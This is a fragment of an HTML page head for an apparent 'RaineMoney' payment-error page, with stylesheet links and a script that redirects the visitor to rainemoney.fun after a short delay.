...
<link rel="shortcut icon" href="http://rainemoney.fun/files/fav_logo.ico" />
    <title>RaineMoney ошибка платежа</title>
    <link rel="apple-touch-icon" href="">
    <link rel="shortcut icon" type="image/x-icon" href="">
    <link href="files/css" rel="stylesheet">
    <!-- BEGIN VENDOR CSS-->
    <link rel="stylesheet" type="text/css" href="files/bootstrap.min.css?V=1">
    ...
    <script>
	setTimeout("document.location.href='http://rainemoney.fun'", 1300);
	</script>
  </head>
